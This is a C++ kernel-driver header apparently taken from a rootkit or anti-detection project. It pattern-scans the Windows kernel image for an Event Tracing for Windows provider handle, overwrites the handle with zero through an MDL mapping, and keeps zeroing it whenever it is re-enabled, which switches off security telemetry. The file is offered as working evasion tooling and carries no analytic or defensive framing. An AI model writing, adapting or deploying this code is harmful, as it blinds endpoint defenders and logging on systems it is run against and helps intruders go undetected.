#pragma once
#include <imports/Defs.h>


namespace etw_disable {

    inline volatile PVOID g_provider_handle = nullptr;
    inline volatile LONG  g_initialized = 0;


    // Page-level MmIsAddressValid — same optimization as CallbackScanner.h.
    // Eliminates thousands of redundant PFN lock acquisitions per pattern scan.
    __forceinline PVOID find_pattern_safe(PVOID start, ULONG size,
                                          const UCHAR* pattern, const char* mask) {
        if (!start || !pattern || !mask || size == 0)
            return nullptr;

        ULONG mask_len = 0;
        while (mask[mask_len]) mask_len++;
        if (mask_len == 0 || mask_len > size)
            return nullptr;

        const UCHAR* base = static_cast<const UCHAR*>(start);
        constexpr ULONG page_size = 0x1000;

        __try {
            for (ULONG i = 0; i <= size - mask_len; ) {
                ULONG_PTR current_addr = reinterpret_cast<ULONG_PTR>(base + i);
                ULONG_PTR current_page = current_addr & ~(static_cast<ULONG_PTR>(page_size) - 1);

                if (!_MmIsAddressValid(reinterpret_cast<PVOID>(current_page))) {
                    ULONG_PTR next_page = current_page + page_size;
                    ULONG skip = static_cast<ULONG>(next_page - current_addr);
                    i += skip;
                    continue;
                }

                ULONG_PTR page_end = current_page + page_size;
                ULONG max_this_page = static_cast<ULONG>(page_end - reinterpret_cast<ULONG_PTR>(base));
                if (max_this_page > size) max_this_page = size;

                for (; i <= max_this_page - mask_len && i <= size - mask_len; ++i) {
                    bool found = true;
                    for (ULONG j = 0; j < mask_len && found; j++) {
                        if (mask[j] == 'x' && base[i + j] != pattern[j])
                            found = false;
                    }
                    if (found)
                        return (PVOID)(base + i);
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }

        return nullptr;
    }

    __forceinline PVOID resolve_relative(PVOID instruction, ULONG offset_to_disp, ULONG total_size) {
        if (!instruction)
            return nullptr;

        UCHAR* ip = static_cast<UCHAR*>(instruction);
        INT32 disp = *reinterpret_cast<INT32*>(ip + offset_to_disp);
        return reinterpret_cast<PVOID>(ip + total_size + disp);
    }


    __forceinline bool safe_write_memory(PVOID dest, const PVOID src, SIZE_T size) {
        if (!dest || !src || size == 0)
            return false;

        __try {
            PMDL mdl = _IoAllocateMdl(dest, (ULONG)size, FALSE, FALSE, nullptr);
            if (!mdl)
                return false;

            _MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
            PVOID mapped = _MmMapLockedPagesSpecifyCache(
                mdl, KernelMode, MmCached, nullptr, FALSE, NormalPagePriority);

            if (mapped) {
                RtlCopyMemory(mapped, src, size);
                _MmUnmapLockedPages(mapped, mdl);
            }

            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return mapped != nullptr;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    __forceinline bool find_and_disable(PVOID nt_base) {
        if (!nt_base || !_MmIsAddressValid(nt_base))
            return false;

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(nt_base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(nt_base) + dos->e_lfanew);
        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
            return false;

        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                continue;

            PVOID section_base = static_cast<UCHAR*>(nt_base) + sections[i].VirtualAddress;
            ULONG section_size = sections[i].Misc.VirtualSize;


            static const UCHAR pat1[] = {
                0x48, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74
            };

            PVOID found = find_pattern_safe(section_base, section_size, pat1, "xxx?????x");
            if (found) {
                PVOID handle = resolve_relative(found, 3, 8);
                if (handle && _MmIsAddressValid(handle)) {
                    g_provider_handle = handle;
                    UINT64 zero = 0;
                    safe_write_memory(handle, &zero, sizeof(zero));
                    return true;
                }
            }


            static const UCHAR pat2[] = {
                0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
                0x48, 0x89, 0x44, 0x24
            };

            found = find_pattern_safe(section_base, section_size, pat2, "xxx????xxxx");
            if (found) {
                PVOID handle = resolve_relative(found, 3, 7);
                if (handle && _MmIsAddressValid(handle)) {
                    g_provider_handle = handle;
                    UINT64 zero = 0;
                    safe_write_memory(handle, &zero, sizeof(zero));
                    return true;
                }
            }
        }

        return false;
    }

    __forceinline bool init() {
        PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
        SN_LOG("etw_disable::init: nt_base=%p", nt_base);
        if (!nt_base) {
            SN_LOG("etw_disable::init: FAIL - no nt_base");
            return false;
        }

        find_and_disable(nt_base);
        SN_LOG("etw_disable::init: provider_handle=%p", (PVOID)g_provider_handle);

        _InterlockedExchange(&g_initialized, 1);
        SN_LOG("etw_disable::init: SUCCESS");
        return true;
    }


    __forceinline bool monitor_reenablement() {
        if (!_InterlockedCompareExchange(&g_initialized, 1, 1))
            return true;

        if (!g_provider_handle || !_MmIsAddressValid((PVOID)g_provider_handle))
            return true;

        __try {
            UINT64 current_value = *static_cast<volatile UINT64*>((PVOID)g_provider_handle);

            if (current_value != 0) {
                InterlockedExchange64(
                    static_cast<volatile LONG64*>((PVOID)g_provider_handle), 0);
                return true;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return true;
        }

        return true;
    }
}
